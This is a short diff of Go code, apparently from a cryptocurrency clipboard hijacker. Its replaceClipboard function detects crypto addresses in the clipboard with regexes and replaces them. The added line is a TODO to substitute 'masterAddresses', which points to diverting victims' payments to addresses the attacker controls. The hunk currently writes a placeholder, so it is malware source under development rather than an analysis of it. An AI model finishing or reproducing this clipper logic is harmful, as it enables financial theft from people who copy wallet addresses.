@@ -48,6 +48,7 @@ func replaceClipboard(clipboardStr string) (string, error) {
 		if r.MatchString(clipboardStr) {
 			log.Printf("found: %s in clipboard, replaced", regexMatch.CryptoName)
 
+			// TODO: make this replace with masterAddresses
 			newStr := r.ReplaceAllString(clipboardStr, "new")
 			return newStr, nil
 		}
